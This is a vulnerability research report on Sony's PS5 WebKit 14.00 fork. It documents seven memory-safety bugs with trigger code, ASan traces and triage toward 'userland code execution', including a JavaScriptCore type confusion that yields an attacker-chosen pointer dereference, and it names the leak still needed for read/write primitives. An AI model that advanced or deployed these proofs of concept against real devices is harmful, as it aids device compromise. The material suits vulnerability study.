# Confirmed memory-safety bugs — Sony WebKit 14.00 (PS5)

Date: 2026-11-05
Target: `WebKit-1400` (Sony OSS archive for PS5 firmware 14.00+)
Build: clang, `-fsanitize=address -O1 -g1 -DNDEBUG -fno-rtti`, GTK port, MiniBrowser + jsc
Method: upstream post-fork fixes re-applied as tests against Sony's tree; see
`05-public-research/gap-analysis/`.

Fork base established by direct source comparison: upstream WebKit ~mid-2023
(Yarr duplicate-group fix present; Sept-2023 WebCore changes absent). Sony's own
patch log is `WebKit-1400-changes.txt` (894 commits, 2023-06-08 → 2026-08-29).

---

## BUG 1 — OOB read in `<meta charset>` parsing

- **File:** `Source/WebCore/html/parser/HTMLMetaCharsetParser.cpp`, `extractCharset()`, line ~58
- **Class:** out-of-bounds read, 2 bytes past a `StringView` buffer
- **Upstream fix:** `e85dcb7a35` — "Fix out-of-bounds read in HTMLMetaCharsetParser.cpp",
  bugs.webkit.org 303520
- **PS5 reachable:** yes (HTML parser core, no feature flag)
- **Visible without ASan:** no
- **Rank:** R3 (crash/DoS only)
- **Reproduction:** 10/10 under ASan

Vulnerable code (Sony):

```cpp
while (pos < length && value[pos] <= ' ')
    ++pos;

if (value[pos] != '=')      // pos may equal length
    continue;
```

Missing upstream guard:

```cpp
if (pos >= length)
    break;
```

Trigger (`LayoutTests/fast/encoding/meta-charset-whitespace-only.html`):

```html
<!DOCTYPE html>
<html><head><meta content="charset   "></head><body>x</body></html>
```

ASan:

```
ERROR: AddressSanitizer: unknown-crash, READ of size 2
  WebCore::extractCharset(StringView)  HTMLMetaCharsetParser.cpp:58
  HTMLMetaCharsetParser::encodingFromMetaAttributes
  TextResourceDecoder::checkForMetaCharset
```

---

## BUG 2 — OOB read in APNG decoding

- **File:** `Source/WebCore/platform/image-decoders/png/PNGImageDecoder.cpp`,
  `rowAvailable()`, line ~544
- **Class:** heap-buffer-overflow read, 1 byte
- **Upstream fix:** `56c0a88ac8` — "[non-cocoa][fuzz] OOB read in APNG with hidden default
  image", bugs.webkit.org 321753
- **PS5 reachable:** yes (`find_package(PNG REQUIRED)` in `OptionsPlayStation.cmake`)
- **Visible without ASan:** no
- **Rank:** R3
- **Reproduction:** 10/10 under ASan

Trigger asset: `LayoutTests/fast/images/resources/apng-hidden-first-frame-offset.png`
(170 bytes; animated PNG, first frame hidden and offset).

```html
<img src="apng-hidden-first-frame-offset.png">
```

ASan:

```
ERROR: AddressSanitizer: heap-buffer-overflow, READ of size 1
  WebCore::PNGImageDecoder::rowAvailable(...)  PNGImageDecoder.cpp:544
  png_process_data
  WebCore::PNGImageDecoder::readChunks
```

---

## BUG 3 — Double-free in XSLT processing

- **File:** `Source/WebCore/xml/XSLTProcessorLibxslt.cpp:372` (`xmlFreeDoc(resultDoc)`)
- **Class:** double-free of a libxml2 node reached through libxslt teardown
- **Origin:** test imported from WPT; references `crbug.com/503627446`
- **PS5 reachable:** **NO** — `OptionsPlayStation.cmake:273`
  `WEBKIT_OPTION_DEFAULT_PORT_VALUE(ENABLE_XSLT PRIVATE OFF)`
- **Visible without ASan:** possible allocator corruption, not guaranteed
- **Rank:** R1 (corruption class) — but irrelevant to PS5
- **Reproduction:** 10/10; persists with libxml2 2.9.14 and 2.12.7

Trigger:

```js
const xsl =
  '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
  '<xsl:template match="/"><r><xsl:for-each select="//*">' +
  '<e><xsl:attribute name="a" xml:space="preserve">' + " ".repeat(64) + '</xsl:attribute></e>' +
  '</xsl:for-each></r></xsl:template></xsl:stylesheet>';
const p = new DOMParser(), proc = new XSLTProcessor();
proc.importStylesheet(p.parseFromString(xsl, "text/xml"));
proc.transformToDocument(p.parseFromString("<r><a></a><b></b></r>", "text/xml"));
```

```text
ERROR: AddressSanitizer: attempting double-free
  free
  xmlFreeNodeList / xmlFreeProp / xmlFreeNodeList / xmlFreeDoc   (libxml2)
  WebCore::XSLTProcessor::transformToString   XSLTProcessorLibxslt.cpp:372
  WebCore::XSLTProcessor::transformToDocument
```

---

## BUG 4 — Proxy handler-traps cache: null dereference (JavaScriptCore)

- **File:** `Source/JavaScriptCore/runtime/ProxyObject.h`,
  `ProxyObject::isHandlerTrapsCacheValid()`
- **Class:** cache validated by StructureID only; poly-proto handler keeps its StructureID
  when its prototype changes, so a null prototype is later cast with `asObject()`
- **Upstream fix:** "[JSC] Fix Structure transition wrong checking issues",
  bugs.webkit.org 323085 (adds `hasMonoProto()` precondition)
- **PS5 reachable:** yes (JavaScriptCore is unconditional)
- **Visible without ASan:** **yes** — hard SEGV, not a sanitizer artifact
- **Rank:** R3 (crash/DoS); release-visible
- **Reproduction:** 10/10 in `jsc` and 10/10 in MiniBrowser (web process dies)

Sony code:

```cpp
ALWAYS_INLINE bool ProxyObject::isHandlerTrapsCacheValid(JSObject* handler)
{
    return handler->structureID() == m_handlerStructureID.value()
        && asObject(handler->getPrototypeDirect())->structureID() == m_handlerPrototypeStructureID.value();
}
```

Upstream:

```cpp
if (handler->structureID() != m_handlerStructureID.value())
    return false;
ASSERT(handler->structure()->hasMonoProto());
return asObject(handler->getPrototypeDirect())->structureID() == m_handlerPrototypeStructureID.value();
```

Minimal trigger (`pocs/proxy-cache-crash.js`, `pocs/proxy-cache-crash.html`):

```js
function makePolyProtoObject() {
    function foo() { class C { constructor() { this._field = 42; } }; return new C; }
    for (let i = 0; i < 15; ++i) foo();
    return foo();
}
const handler = makePolyProtoObject();
Object.setPrototypeOf(handler, Object.prototype);
handler.get = (t, k) => "got " + k;
const proxy = new Proxy({}, handler);
proxy.foo;
Object.setPrototypeOf(handler, null);
proxy.foo;               // asObject(jsNull) -> SEGV at 0x2
```

```text
ERROR: AddressSanitizer: SEGV on unknown address 0x000000000002
  JSC::StructureID::decontaminate()
  JSC::JSCell::classInfo()
  JSC::asObject(JSCell*)
  JSC::ProxyObject::isHandlerTrapsCacheValid(JSObject*)  ProxyObject.h:155
  JSC::ProxyObject::getHandlerTrap(...)                  ProxyObject.cpp:107
```

---

## Summary

| # | Bug | PS5 | Release-visible | Impact |
|---|---|---|---|---|
| 1 | meta charset OOB read | yes | no | none observable |
| 2 | APNG OOB read | yes | no | none observable |
| 3 | XSLT double-free | **no** | — | — |
| 4 | Proxy null deref (JSC) | yes | **yes** | web process crash on page load |

None of the four yields code execution. Bugs 1, 2 and 4 produce no attacker-controlled
memory corruption; bug 3 is a corruption class but is compiled out on PlayStation.

Next target class: JavaScriptCore use-after-free / out-of-bounds write, which are the
primitives that can actually become userland code execution.

---

# Bug 5 — Date#setTime NaN not purified (DFG/FTL) — type confusion

- **File:** `Source/JavaScriptCore/dfg/DFGSpeculativeJIT64.cpp:6595`,
  `Source/JavaScriptCore/ftl/FTLLowerDFGToB3.cpp:17939`
- **Class:** type confusion — `Date#setTime` can store an arbitrary NaN-boxed value
  instead of canonical NaN
- **Upstream fix:** bug 260497, "[JSC] Purify NaN for Date#setTime DFG / FTL
  implementations" — changes `DoubleGreaterThanAndOrdered` → `DoubleGreaterThanOrUnordered`
  and `doubleGreaterThan` → `doubleGreaterThanOrUnordered`
- **Sony code:** still uses the ordered variants (verified at both sites)
- **PS5 reachable:** yes (JavaScriptCore core)
- **Reproduced:** SEGV, 2/2 with tier forcing, 2/2 default
- **Test:** `JSTests/stress/date-set-time-purify-nan.js` (no `$vm`, no directives)

# Bug 6 — GC re-entrancy in ErrorInstance::computeErrorInfo

- **File:** `Source/JavaScriptCore/runtime/ErrorInstance.cpp`,
  `ErrorInstance::computeErrorInfo()`
- **Class:** GC re-entrancy while materialising the stack string
- **Upstream fix:** bug 267785, "[JSC] Fix Re-entrancy in ErrorInstance::computeErrorInfo"
  — adds `DeferGC deferGC(vm);`
- **Sony code:** the `DeferGC` is absent (verified)
- **PS5 reachable:** yes
- **Reproduced:** SEGV, 2/2 with tier forcing, 2/2 default
- **Test:** `JSTests/stress/error-instance.js` (no `$vm`, no directives)

## Triage result for Bug 6 (2026-11-05)

Crash stack: `StringImpl::copyCharacters` <- `StringView::getCharacters16` <-
`JSRopeString::resolveToBuffer` <- `resolveRope` — i.e. a freed rope string is read while
materialising `error.stack`.

Leak hypothesis: if the freed rope memory were still mapped, the resulting JS string would
contain stale heap data. This was tested on the **TSan build** (no ASan poisoning/quarantine):

```
build-tsan/bin/jsc  error-instance.js
rc=0  →  SEGV on unknown address (high value), READ, unmapped
```

The dangling pointer targets unmapped memory even without ASan, so the result is a hard
crash, not a controlled disclosure. **Bug 6 does not provide the leak bug 5 needs.**

## Sweep validity note

The JSC corpus run produced 6 hits. Three were discarded as invalid because the tests
require harness features the runner does not provide (`$vm.createCustomTestGetterSetter`,
`//@ requireOptions(...)`, `//@ runNoFTL(...)`): `bigint-oom-import`,
`re-enter-resolve-rope-string`, `runString-returns-globalThis-not-globalObject`.
Bugs 5 and 6 are from tests with no such requirements. A control program (plain loop)
runs clean with and without tier forcing, so the JIT is not uniformly broken.

**Status of bugs 5 and 6:** existence and trigger verified; controllability not yet
established. Both are the correct class for a userland primitive (type confusion /
re-entrancy), unlike bugs 1–4.

## Triage result for Bug 5 (2026-11-05)

The NaN payload reaches a pointer dereference. jsc, 2,000,000 warm-up calls, then:

```
payload 0xfffe000000001234 -> SEGV at 0x1239      (payload + 5)
payload 0xfffe000041414141 -> SEGV at 0x41414146  (payload + 5)
```

Stack: `TypeInfo::isObject` <- `JSValue::isObject` <- `jsAddNonNumber` <- `operationValueAddProfiled`.

So `date.getTime()` returns a JSValue whose cell pointer is attacker-supplied, and the
engine dereferences it.

Write-path probes, all READ-only so far:

| mode | fault address | access |
|---|---|---|
| `t.foo = 1` | 0x41414141 | READ |
| `o.x = t` | 0x41414146 | READ |
| `a[t] = 1` | 0x41414146 | READ |

Conclusion: controlled **dereference**, not arbitrary read/write. Every operation reads the
fake cell's Structure/TypeInfo before any store can happen, so a write requires memory at
the chosen address that contains a valid structure pointer — i.e. an address leak or heap
grooming, which this bug does not provide on its own.

**This is the current frontier.** Turning it into r/w needs a companion information leak.

# Bug 7 — Empty private brand in computed property name (JSC)

- **File:** `Source/JavaScriptCore/bytecompiler` private-brand handling (`emitCheckPrivateBrand`)
- **Class:** missing `check_tdz` → null dereference at `0x5`
- **Upstream fix:** bug 273978, "[JSC] Private brand can be empty in computed property name"
- **Sony code:** fix absent
- **PS5 reachable:** yes
- **Reproduced:** 3/3, SEGV at `0x000000000005`
- **Test:** `JSTests/stress/use-static-private-member-in-computed-property-name.js`
  (no `$vm`, no directives)
- **Rank:** R3 (crash only)

## Corpus totals

```
JSC sweep:  13,187 tests → 6 hits → 3 discarded, 3 confirmed (bugs 5, 6, 7)
WebCore:    3,115 pages  → 3 confirmed (bugs 1, 2, 3) + bug 4 from the JSC/PoC track
```